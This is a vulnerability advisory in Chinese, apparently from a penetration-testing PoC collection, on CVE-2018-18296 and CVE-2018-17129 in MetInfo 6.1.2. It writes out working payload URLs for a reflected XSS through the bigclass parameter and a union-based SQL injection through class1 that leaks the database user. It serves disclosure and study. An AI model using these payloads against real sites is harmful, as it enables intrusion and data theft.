---
cve: "CVE-2018-18296"
source: "Mr-xn/Penetration_Testing_POC"
product: "MetInfo6.1.2"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: "CVE-2018-18296; CVE-2018-17129"
referenced_identifiers: ""
identifier_role: "primary"
identifier_status: "unknown"
title: "Metinfo-6.1.2版本存在XSS漏洞&SQL注入漏洞2"
prerequisites: "来源所述条件，未列明部分仍待核：后台登录及相应栏目/反馈导出权限"
side_effects: "未执行；原文未提供完整的状态变化与恢复证据，实际操作影响按本文入口、进程权限和实验条件核对"
source_status: "unknown"
id: "vw-38f174e79ec4f2434f947d9e"
entity_id: "ve-38f174e79ec4f2434f947d9e"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：后台登录及相应栏目/反馈导出权限

- **证据待核（1）**：与274同文，仅增加无图的POC截图效果标题，不能视新增实证。保留原引用、截图位置和实验叙述；本项所缺材料未被补造，截图存在或作者宣称成功都不等于已核验其内容。

- **结论使用边界（2）**：同样漏17129元数据与//对/**/冲突。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Metinfo-6.1.2版本存在XSS漏洞&SQL注入漏洞2

### 漏洞简介  

|漏洞名称|上报日期|漏洞发现者|产品首页|软件链接|版本|CVE编号|
--------|--------|---------|--------|-------|----|------|
|Metinfo-6.1.2版本存在XSS漏洞&SQL注入漏洞|2018-10-12|踏月留香|[https://www.metinfo.cn/](https://www.metinfo.cn/) | [下载地址](https://www.metinfo.cn/upload/file/MetInfo6.1.2.zip) |6.1.2| [CVE-2018-18296](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-18296)/[CVE-2018-17129](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2018-17129)|  

#### 漏洞概述  

> 漏洞存在于MetInfo6.1.2/admin/index.php页面，由于参数bigclass过滤不严，导致XSS漏洞
本地搭建网站，首先登录网站后台:`http://172.16.141.134/MetInfo6.1.2/admin/`，登录成功后，构造payload：
`http://172.16.141.134/MetInfo6.1.2/admin/index.php?lang=cn&anyid=25&n=column&c=index&a=doadd&bigclass=1%22%3e%3cscript%3ealert(/xss/)%3c%2fscript%3e` ，即可执行跨站脚本。  

### POC实现代码如下：  

> XSS漏洞的 exp代码如下：  

``` html
http://127.0.0.1/MetInfo6.1.2/admin/index.php?lang=cn&anyid=25&n=column&c=index&a=doadd&bigclass=1%22%3e%3cscript%3ealert(/xss/)%3c%2fscript%3e
```

> SQL注入漏洞的 exp代码如下：  
> 漏洞存在于MetInfo6.1.2 `/app/system/feedback/admin/feedback_admin.class.php`页面中，由于该页面的class1参数过滤不严，导致存在SQL注入漏洞。
本地搭建网站，首先登录网站后台:`http://172.16.141.134/MetInfo6.1.2/admin/`，登录成功后，构造payload：
`http://172.16.141.134/MetInfo6.1.2/admin/index.php?lang=cn&anyid=29&n=feedback&c=feedback_admin&a=doexport&class1=-1//union//select//concat(0x3a,user(),0x3a)//from/**/information_schema.tables&met_fd_export=-1`，访问后网站会导出一个excel表，excel表的名称为数据库用户名。


``` html
http://127.0.0.1/MetInfo6.1.2/admin/index.php?lang=cn&anyid=29&n=feedback&c=feedback_admin&a=doexport&class1=-1/**/union/**/select/**/concat(0x3a,user(),0x3a)/**/from/**/information_schema.tables&met_fd_export=-1
```

### POC截图效果如下：

- XSS漏洞POC运行截图


- SQL注入漏洞POC运行截图


---

> 来源：Mr-xn/Penetration_Testing_POC
